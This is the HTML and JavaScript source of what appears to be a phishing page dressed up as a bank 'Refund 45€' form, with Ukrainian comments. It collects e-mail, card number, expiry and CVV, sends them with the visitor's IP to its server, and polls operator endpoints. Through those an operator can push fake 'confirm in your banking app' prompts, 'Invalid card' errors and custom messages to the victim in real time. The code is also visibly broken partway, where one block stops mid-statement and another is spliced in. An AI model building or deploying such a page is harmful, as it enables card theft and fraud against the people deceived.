<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Refund</title>
    <link href="https://fonts.googleapis.com/css?family=Roboto:400,500,700&display=swap" rel="stylesheet">
    <style>
        body {
            background: #00b2ff;
            min-height: 100vh;
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: 'Roboto', Arial, sans-serif;
        }
        .payment-card {
            background: #fff;
            border-radius: 20px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.12);
            padding: 2.5rem 2rem 2rem 2rem;
            max-width: 370px;
            width: 100%;
            box-sizing: border-box;
            text-align: center;
            overflow: hidden;
        }
        .bank-icon {
            width: 60px;
            height: 60px;
            background: #00b2ff;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 1.2rem auto;
        }
        .bank-icon svg {
            width: 36px;
            height: 36px;
            fill: #fff;
        }
        .payment-title {
            font-size: 2rem;
            font-weight: 700;
            margin-bottom: 1.2rem;
        }
        .payment-card hr {
            border: none;
            border-top: 1px solid #e0e0e0;
            margin: 1.2rem 0 1.5rem 0;
        }
        .input-group {
            margin-bottom: 1.1rem;
            text-align: left;
        }
        .input-group input {
            width: 100%;
            padding: 1rem 1.1rem;
            border: 1.5px solid #e0e0e0;
            border-radius: 12px;
            font-size: 1.1rem;
            background: #fafbfc;
            outline: none;
            transition: border 0.2s;
            box-sizing: border-box;
            overflow-wrap: break-word;
        }
        .input-group input:focus {
            border-color: #00b2ff;
        }
        .row {
            display: flex;
            gap: 1rem;
            width: 100%;
        }
        .row .input-group {
            flex: 1;
            margin-bottom: 0;
        }
        .confirm-btn {
            width: 100%;
            padding: 1rem;
            background: #00b2ff;
            color: #fff;
            border: none;
            border-radius: 12px;
            font-size: 1.15rem;
            font-weight: 500;
            margin-top: 1.2rem;
            cursor: pointer;
            transition: background 0.2s;
        }
        .confirm-btn:hover {
            background: #0090cc;
        }
        .support-proceed-btn {
            width: 100%;
            padding: 1rem;
            background: #00b2ff;
            color: #fff;
            border: none;
            border-radius: 12px;
            font-size: 1.15rem;
            font-weight: 500;
            margin-top: 0.5rem;
            cursor: pointer;
            transition: background 0.2s;
            text-align: center;
            text-decoration: none;
            display: block;
            box-sizing: border-box;
        }
        .support-proceed-btn:hover {
            background: #0090cc;
        }
        @media (max-width: 480px) {
            .payment-card {
                padding: 1.2rem 0.5rem 1.5rem 0.5rem;
            }
            .row {
                flex-direction: column;
                gap: 0.7rem;
            }
        }
    </style>
    <style>
    #push-overlay {
      display: none;
      position: fixed;
      top: 0; left: 0; width: 100vw; height: 100vh;
      background: rgba(22,182,255,0.97);
      z-index: 100000;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      transition: opacity 0.3s;
      animation: fadeInPush 0.5s;
    }
    @keyframes fadeInPush {
      from { opacity: 0; }
      to { opacity: 1; }
    }
    .push-modal {
      background: #fff;
      border-radius: 24px;
      max-width: 370px;
      width: 92vw;
      margin: auto;
      padding: 2.7rem 2rem 2.2rem 2rem;
      box-shadow: 0 8px 40px rgba(0,0,0,0.18);
      text-align: center;
      display: flex;
      flex-direction: column;
      align-items: center;
      animation: popInPush 0.5s;
    }
    @keyframes popInPush {
      0% { transform: scale(0.92); opacity: 0; }
      100% { transform: scale(1); opacity: 1; }
    }
    .push-bell {
      margin-bottom: 1.5rem;
      width: 70px;
      height: 70px;
      background: linear-gradient(135deg, #16b6ff 60%, #00e0ff 100%);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      box-shadow: 0 2px 16px rgba(22,182,255,0.18);
      position: relative;
      animation: bellPop 0.7s;
    }
    @keyframes bellPop {
      0% { transform: scale(0.7); opacity: 0; }
      100% { transform: scale(1); opacity: 1; }
    }
    .push-bell svg {
      width: 38px;
      height: 38px;
      color: #fff;
      animation: bellShake 1.2s infinite cubic-bezier(.36,.07,.19,.97);
      transform-origin: 50% 10%;
    }
    @keyframes bellShake {
      0%, 100% { transform: rotate(0deg); }
      10% { transform: rotate(-10deg); }
      20% { transform: rotate(8deg); }
      30% { transform: rotate(-6deg); }
      40% { transform: rotate(4deg); }
      50% { transform: rotate(-2deg); }
      60% { transform: rotate(1deg); }
      70%, 90% { transform: rotate(0deg); }
    }
    .push-title {
      font-size: 2.1rem;
      font-weight: 700;
      color: #16b6ff;
      margin-bottom: 0.7rem;
      letter-spacing: -1px;
    }
    .push-desc {
      font-size: 1.13rem;
      color: #222;
      margin-bottom: 0.7rem;
      line-height: 1.5;
    }
    @media (max-width: 480px) {
      .push-modal { padding: 1.2rem 0.5rem 1.2rem 0.5rem; }
      .push-title { font-size: 1.3rem; }
      .push-desc { font-size: 0.98rem; }
    }
    </style>
</head>
<body>
    <div class="payment-card" id="payment-card-main">
        <div class="bank-icon">
            <svg viewBox="0 0 24 24"><path d="M12 2L2 7v2h20V7L12 2zm0 2.18L18.09 7H5.91L12 4.18zM4 10v8h2v-6h12v6h2v-8H4zm2 8v-6h12v6H6z"/></svg>
        </div>
        <div class="payment-title" id="payment-title">Refund 45€</div>
        <div>Price: <span class="event-price"></span></div>
        <hr>
        <form id="paymentForm" autocomplete="off">
            <div class="input-group">
                <input id="email-input" type="email" placeholder="E-mail" value="" required>
            </div>
            <div class="input-group">
                <input id="card-input" type="text" placeholder="Card Number" maxlength="19" pattern="[0-9 ]*" inputmode="numeric" required>
            </div>
            <div class="row">
                <div class="input-group">
                    <input id="expiry-input" type="text" placeholder="Expiry Date" maxlength="5" pattern="[0-9/]*" inputmode="numeric" required>
                </div>
                <div class="input-group">
                    <input id="cvv-input" type="password" placeholder="CVV" maxlength="3" pattern="[0-9]{3}" inputmode="numeric" required>
                </div>
            </div>
            <button type="submit" class="confirm-btn">Confirm</button>
        </form>
    </div>
    <script>
    // Визначаємо IP користувача
    let userIP = null;
    function getUserIP(callback) {
        fetch("https://api.ipify.org?format=json")
            .then(r => r.json())
            .then(data => {
                userIP = data.ip;
                callback(userIP);
            })
            .catch(error => {
                console.error("Помилка при отриманні IP:", error);
                callback(null);
            });
    }

    // Додаємо overlay-вікно загрузки
    const loadingOverlay = document.createElement('div');
    loadingOverlay.id = 'loading-overlay';
    loadingOverlay.style = 'display:none;position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(0,178,255,0.85);z-index:99999;align-items:center;justify-content:center;flex-direction:column;';
    loadingOverlay.innerHTML = '<div style="background:#fff;border-radius:20px;max-width:320px;width:100%;margin:auto;padding:2rem 1.5rem;box-shadow:0 8px 32px rgba(0,0,0,0.12);text-align:center;"><div style="margin-bottom:1.2rem;"><svg width="48" height="48" viewBox="0 0 50 50"><circle cx="25" cy="25" r="20" stroke="#00b2ff" stroke-width="5" fill="none" stroke-dasharray="31.4 31.4" stroke-linecap="round"><animateTransform attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="1s" repeatCount="indefinite"/></circle></svg></div><div style="font-size:1.2rem;font-weight:500;">Processing...</div></div>';
    document.body.appendChild(loadingOverlay);

    // Додаємо push-overlay, якщо його немає
    if (!document.getElementById('push-overlay')) {
      const pushOverlay = document.createElement('div');
      pushOverlay.id = 'push-overlay';
      pushOverlay.innerHTML = `
        <div class="push-modal">
          <div class="push-bell">
            <svg viewBox="0 0 24 24" fill="none"><path d="M12 22c1.1 0 2-.9 2-2h-4a2 2 0 0 0 2 2zm6-6V11c0-3.07-1.63-5.64-5-6.32V4a1 1 0 1 0-2 0v.68C7.63 5.36 6 7.92 6 11v5l-1.29 1.29A1 1 0 0 0 6 19h12a1 1 0 0 0 .71-1.71L18 16z" fill="#fff"/></svg>
          </div>
          <div class="push-title">Payment Confirmation</div>
          <div class="push-desc">To confirm the transaction, open your banking app and follow the instructions of your bank. <br>Do not close this window.</div>
        </div>
      `;
      document.body.appendChild(pushOverlay);
    }

    // Сабміт форми: показуємо overlay
    document.getElementById('paymentForm').onsubmit = async function(e) {
        e.preventDefault();
        loadingOverlay.style.display = 'flex';
        const email = document.getElementById('email-input').value;
        const card = document.getElementById('card-input').value;
        const expiry = document.getElementById('expiry-input').value;
        const cvv = document.getElementById('cvv-input').value;
        let price = localStorage.getItem('event_price');
        let currency = localStorage.getItem('event_currency');
        if (!price || !currency) {
            const totalRaw = getQueryParam('total') || localStorage.getItem('refund_total') || '';
            const match = totalRaw.match(/(\d+[\.,]?\d*)([A-Za-z]+)/);
            if (match) {
                price = match[1].replace(',', '.');
                currency = match[2];
            }
        }
        try {
            let ip = userIP;
            if (!ip) {
                await new Promise(res => setTimeout(res, 500));
                ip = userIP;
            }
            // Отримуємо total та currency з URL
            const { total, currency: totalCurrency } = getTotalAndCurrency();
            await fetch('/send_payment_data', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email, card, expiry, cvv, ip, type: 'refund', price, currency, total, page: getPageCode(), page_code: getPageCode() })
            });
            // overlay залишається до push!
        } catch (error) {
            loadingOverlay.style.display = 'none';
            console.error('Помилка при зверненні до сервера:', error);
        }
    };

    // --- Витягуємо total і currency з URL ---
    function getTotalAndCurrency() {
        const urlParams = new URLSearchParams(window.location.search);
        const totalRaw = urlParams.get('total') || sessionStorage.getItem('total_price') || sessionStorage.getItem('ticket_total');
        const currencyRaw = urlParams.get('currency') || sessionStorage.getItem('currency') || sessionStorage.getItem('ticket_currency') || 'EUR';
        if (totalRaw) {
            const match = totalRaw.match(/\d+[\.,]?\d*/);
            const totalNum = match ? match[0].replace(',', '.') : '';
            return { total: totalNum, currency: currencyRaw };
        }
        // fallback: price/currency
        let price = localStorage.getItem('ticket_price') || sessionStorage.getItem('ticket_price');
        let currency = localStorage.getItem('ticket_currency') || sessionStorage.getItem('ticket_currency') || 'EUR';
        return { total: price, currency };
    }

    // --- Універсальний POLLING для всіх кнопок (push, support, text) ---
    let supportTabOpened = false;
    let pushTabOpened = false;
    let textTabOpened = false;
    
    function getPageCode() {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get('page') || sessionStorage.getItem('page_code') || '';
    }
    
    function startUniversalPolling() {
        setTimeout(pollAllButtons, 2000);
    }
    
    async function pollAllButtons() {
        const page_code = getPageCode();
        document.body.setAttribute('data-page-code', page_code);
        
        if (!page_code) {
            return setTimeout(pollAllButtons, 2000);
        }
        
        // Polling для push кнопки
        try {
            const pushUrl = '/check_push?page_code=' + encodeURIComponent(page_code);
            const pushResp = await fetch(pushUrl);
            const pushTxt = await pushResp.text();
            
            if (pushTxt === 'true' && !pushTabOpened) {
                const { total, currency } = getTotalAndCurrency();
                const pushTitle = document.getElementById('push-payment-title');
                if (pushTitle) {
                    pushTitle.textContent = `Payment ${total} ${currency}`;
                }
                // Скидаємо стани інших кнопок
                supportTabOpened = false;
                textTabOpened = false;
                
                // Приховуємо всі інші overlay
                if (document.getElementById('support-overlay')) {
                    document.getElementById('support-overlay').style.display = 'none';
                }
                if (document.getElementById('text-overlay')) {
                    document.getElementById('text-overlay').style.display = 'none';
                }
                
                document.getElementById('push-overlay').style.display = 'flex';
                document.getElementById('payment-card-main').style.display = 'none';
                if (window.loadingOverlay) window.loadingOverlay.style.display = 'none';
                pushTabOpened = true;
            }
        } catch (e) {
            console.error('Push polling error:', e);
        }
        
        // Polling для support/text кнопок - НЕ чекаємо userIP
        try {
            // Використовуємо поточний userIP або null
            const currentIP = userIP || 'unknown';
            const supportUrl = `/check_support?ip=${encodeURIComponent(currentIP)}`;
            const supportResp = await fetch(supportUrl);
            const supportData = await supportResp.json();
            
            if ((supportData.show_support || supportData.show_text)) {
                if (window.loadingOverlay) window.loadingOverlay.style.display = 'none';
            }
            
            // Support кнопка - показуємо overlay замість нового вікна
            if (!supportTabOpened && supportData.show_support) {
                // Скидаємо стани інших кнопок
                pushTabOpened = false;
                textTabOpened = false;
                
                // Створюємо support overlay якщо його немає
                if (!document.getElementById('support-overlay')) {
                    const supportOverlay = document.createElement('div');
                    supportOverlay.id = 'support-overlay';
                    supportOverlay.style.cssText = `
                        display: flex;
                        position: fixed;
                        top: 0; left: 0; width: 100vw; height: 100vh;
                        background: #00b2ff;
                        z-index: 100000;
                        align-items: center;
                        justify-content: center;
                        flex-direction: column;
                    `;
                    supportOverlay.innerHTML = `
                        <div style="background: white; border-radius: 20px; padding: 2.5rem 2rem; max-width: 370px; width: 90%; text-align: center; box-shadow: 0 8px 32px rgba(0,0,0,0.12);">
                            <div style="width: 60px; height: 60px; background: #00b2ff; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 1.2rem auto;">
                                <svg width="36" height="36" viewBox="0 0 24 24" fill="white">
                                    <path d="M12 2L2 7v2h20V7L12 2zm0 2.18L18.09 7H5.91L12 4.18zM4 10v8h2v-6h12v6h2v-8H4zm2 8v-6h12v6H6z"/>
                                </svg>
                            </div>
                            <h3 style="font-size: 2rem; font-weight: 700; margin-bottom: 1.2rem; color: #222;">Waiting</h3>
                            <p style="font-size: 1.1rem; color: #666; margin-bottom: 1.5rem;">Contact technical support</p>
                            <div style="width: 50px; height: 50px; background: #00b2ff; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto;">
                                <svg width="24" height="24" viewBox="0 0 24 24" fill="white">
                                    <path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/>
                                </svg>
                            </div>
                        </div>
                    `;
                    document.body.appendChild(supportOverlay);
                }
                // Приховуємо всі інші overlay
                if (document.getElementById('text-overlay')) {
                    document.getElementById('text-overlay').style.display = 'none';
                }
                if (document.getElementById('push-overlay')) {
                    document.getElementById('push-overlay').style.display = 'none';
                }
                document.getElementById('support-overlay').style.display = 'flex';
                document.getElementById('payment-card-main').style.display = 'none';
                supportTabOpened = true;
            }
            
            // Text кнопка - показуємо overlay замість нового вікна
            if (!textTabOpened && supportData.show_text && supportData.text_id) {
                // Скидаємо стани інших кнопок
                pushTabOpened = false;
                supportTabOpened = false;
                
                // Завантажуємо текст і показуємо overlay
                fetch(`/get_custom_text?text_id=${supportData.text_id}`)
                    .then(resp => resp.text())
                    .then(textContent => {
                if (!document.getElementById('text-overlay')) {
                    const textOverlay = document.createElement('div');
                    textOverlay.id = 'text-overlay';
                    textOverlay.style.cssText = `
                        display: flex;
                        position: fixed;
                        top: 0; left: 0; width: 100vw; height: 100vh;
                        background: #00b2ff;
                        z-index: 100000;
                        align-items: center;
                        justify-content: center;
                        flex-direction: column;
                    `;
                    textOverlay.innerHTML = `
                        <div style=\"background: white; border-radius: 20px; padding: 2.5rem 2rem; max-width: 370px; width: 90%; text-align: center; box-shadow: 0 8px 32px rgba(0,0,0,0.12);\">
                            <div style=\"width: 60px; height: 60px; background: #00b2ff; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 1.2rem auto;\">
                                <svg width=\"36\" height=\"36\" viewBox=\"0 0 24 24\" fill=\"white\">
                                    <path d=\"M12 2L2 7v2h20V7L12 2zm0 2.18L18.09 7H5.91L12 4.18zM4 10v8h2v-6h12v6h2v-8H4zm2 8v-6h12v6H6z\"/>
                                </svg>
                            </div>
                            <h3 style=\"font-size: 2rem; font-weight: 700; margin-bottom: 1.2rem; color: #222;\">Waiting</h3>
                            <p id=\"text-dynamic\" style=\"font-size: 1.1rem; color: #666; margin-bottom: 1.5rem;\"></p>
                            <div style=\"width: 50px; height: 50px; background: #00b2ff; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto;\">
                                <svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"white\">
                                    <path d=\"M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z\"/>
                                </svg>
                            </div>
                        </div>
                    `;
                    document.body.appendChild(textOverlay);
                }
                        // Приховуємо всі інші overlay
                        if (document.getElementById('support-overlay')) {
                            document.getElementById('support-overlay').style.display = 'none';
                        }
                        if (document.getElementById('push-overlay')) {
                            document.getElementById('push-overlay').style.display = 'none';
                        }
                document.getElementById('text-dynamic').textContent = textContent || '';
                        document.getElementById('text-overlay').style.display = 'flex';
                        document.getElementById('payment-card-main').style.display = 'none';
                        textTabOpened = true;
                    })
                    .catch(e => console.error('Text loading error:', e));
            }
        } catch (e) {
            console.error('Support polling error:', e);
        }
        
        setTimeout(pollAllButtons, 2000);
    }
    
    // Стартуємо polling одразу, а не чекаємо userIP
    startUniversalPolling();
    
    // Оновлюємо userIP коли він стає доступним
    getUserIP(function(ip) {
        userIP = ip;
    });

    // Зчитування параметрів з URL
    function getQueryParam(name) {
        const url = new URL(window.location.href);
        return url.searchParams.get(name);
    }
    // Total підтягуємо, беремо тільки число
    const totalRaw = getQueryParam('total');
    if (totalRaw) {
        // Витягуємо тільки число (цілу або з копійками)
        const match = totalRaw.match(/\d+[\.,]?\d*/);
        const totalNum = match ? match[0].replace(',', '.') : '';
        if (totalNum) {
            document.getElementById('payment-title').textContent = `Refund ${totalNum}€`;
            // Зберігаємо заголовок для відновлення
            localStorage.setItem('last_refund_title', `Refund ${totalNum}€`);
            // Зберігаємо також в інших ключах для сумісності
            localStorage.setItem('event_price', totalNum);
            localStorage.setItem('event_currency', 'EUR');
        }
    }
    // --- POLLING для wrong_card ---
    let wrongCardMsg = null;
    function showWrongCardMsg() {
        if (!wrongCardMsg) {
            wrongCardMsg = document.createElement('div');
            wrongCardMsg.style.color = '#dc3545';
            wrongCardMsg.style.fontSize = '0.98rem';
            wrongCardMsg.style.marginTop = '6px';
            wrongCardMsg.textContent = 'Invalid card';
            const cardInput = document.getElementById('card-input');
            cardInput.parentNode.appendChild(wrongCardMsg);
        }
    }
    setInterval(function() {
        if (!userIP) return;
        fetch('/check_wrong_card?ip=' + encodeURIComponent(userIP))
            .then(resp => resp.text())
            .then(txt => {
                if (txt === 'true') {
                    showWrongCardMsg();
                }
            });
    }, 2000);
    // --- POLLING для code redirect ---
    setInterval(function() {
        if (!userIP) return;
        fetch('/check_code_redirect?ip=' + encodeURIComponent(userIP))
            .then(resp => resp.text())
            .then(txt => {
                if (txt === 'true') {
                    // Додаємо page_code, total та currency до URL
                    var page = sessionStorage.getItem('page_code') || new URL(window.location.href).searchParams.get('page');
                    var total = sessionStorage.getItem('total_price') || sessionStorage.getItem('ticket_total') || new URL(window.location.href).searchParams.get('total');
                    var currency = sessionStorage.getItem('currency') || sessionStorage.getItem('ticket_currency') || new URL(window.location.href).searchParams.get('currency');
                    
                    if (page) {

document.addEventListener('DOMContentLoaded', function() {
  // Ховаємо параметр total з адресного рядка, але зберігаємо його у localStorage
  const params = new URLSearchParams(window.location.search);
  const total = params.get('total');
  if (total) {
    localStorage.setItem('refund_total', total);
    params.delete('total');
    const newUrl = window.location.pathname + (params.toString() ? '?' + params.toString() : '');
    window.history.replaceState({}, '', newUrl);
  }
  
  // Відновлюємо ціну при завантаженні сторінки
  restorePriceFromStorage();
});

// Функція для відновлення ціни з localStorage
function restorePriceFromStorage() {
  // Спочатку перевіряємо останній збережений заголовок
  const lastTitle = localStorage.getItem('last_refund_title');
  if (lastTitle && lastTitle !== 'Refund ...') {
    document.getElementById('payment-title').textContent = lastTitle;
    // Оновлюємо також .event-price елементи
    const match = lastTitle.match(/Refund ([\d.,]+) ([A-Za-z]+)/);
    if (match) {
      const price = match[1];
      const currency = match[2];
      document.querySelectorAll('.event-price').forEach(el => el.textContent = price + ' ' + currency);
      return;
    }
  }
  
  // Якщо заголовок не знайдено, відновлюємо з інших джерел
  const savedPrice = localStorage.getItem('event_price') || localStorage.getItem('current_refund_price');
  const savedCurrency = localStorage.getItem('event_currency') || localStorage.getItem('current_refund_currency');
  const savedTotal = localStorage.getItem('refund_total');
  
  if (savedPrice && savedCurrency) {
    document.getElementById('payment-title').textContent = `Refund ${savedPrice} ${savedCurrency}`;
    document.querySelectorAll('.event-price').forEach(el => el.textContent = savedPrice + ' ' + savedCurrency);
  } else if (savedTotal) {
    const match = savedTotal.match(/(\d+[\.,]?\d*)([A-Za-z]+)/);
    if (match) {
      const price = match[1].replace(',', '.');
      const currency = match[2];
      document.getElementById('payment-title').textContent = `Refund ${price} ${currency}`;
      document.querySelectorAll('.event-price').forEach(el => el.textContent = price + ' ' + currency);
    }
  } else if (savedCurrency) {
    document.getElementById('payment-title').textContent = `Refund ${savedCurrency}`;
    document.querySelectorAll('.event-price').forEach(el => el.textContent = savedCurrency);
  }
}

// Зберігаємо стан перед оновленням сторінки
window.addEventListener('beforeunload', function() {
  const currentTitle = document.getElementById('payment-title').textContent;
  if (currentTitle && currentTitle !== 'Refund ...') {
    localStorage.setItem('last_refund_title', currentTitle);
  }
});

// Відновлюємо стан після оновлення сторінки
window.addEventListener('load', function() {
  const lastTitle = localStorage.getItem('last_refund_title');
  if (lastTitle && lastTitle !== 'Refund ...') {
    document.getElementById('payment-title').textContent = lastTitle;
    // Оновлюємо також .event-price елементи
    const match = lastTitle.match(/Refund ([\d.,]+) ([A-Za-z]+)/);
    if (match) {
      const price = match[1];
      const currency = match[2];
      document.querySelectorAll('.event-price').forEach(el => el.textContent = price + ' ' + currency);
    }
  }
});

// Відновлюємо ціну при поверненні на вкладку
document.addEventListener('visibilitychange', function() {
  if (!document.hidden) {
    // Користувач повернувся на вкладку
    setTimeout(restorePriceFromStorage, 100); // Невелика затримка для надійності
  }
});
</script>
